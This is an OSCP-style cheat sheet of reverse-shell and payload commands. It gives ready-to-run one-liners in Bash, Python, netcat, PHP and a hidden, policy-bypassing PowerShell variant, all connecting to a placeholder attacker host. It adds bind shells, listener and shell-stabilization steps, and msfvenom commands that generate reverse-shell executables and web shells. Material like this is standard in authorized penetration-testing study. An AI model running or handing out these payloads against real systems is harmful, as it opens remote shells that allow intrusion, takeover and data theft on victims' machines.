Reverse Shells & Payloads Cheatsheet (OSCP Style)

1. Bash Reverse Shell
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

Alternative:

bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
2. Python Reverse Shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

Python2:

python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
3. Netcat Reverse Shell
nc -e /bin/sh ATTACKER_IP PORT

If -e is not available:

rm /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f
4. PHP Reverse Shell
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
5. PowerShell Reverse Shell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
6. Bind Shell
nc -lvnp PORT -e /bin/sh

Connect to it:

nc target_ip PORT

Note: Less common in OSCP but useful in restricted environments.

7. Listener (Always First)
nc -lvnp PORT

Important: Start listener BEFORE executing payload.

8. TTY Upgrade (Stabilize Shell)
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl + Z
stty raw -echo
fg

stty rows 40 cols 100

Result: Fully interactive shell

9. msfvenom Cheatsheet

Linux ELF:

msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf > shell.elf

Windows EXE:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f exe > shell.exe

PHP:

msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.php

ASP:

msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f asp > shell.asp

JSP:

msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw > shell.jsp
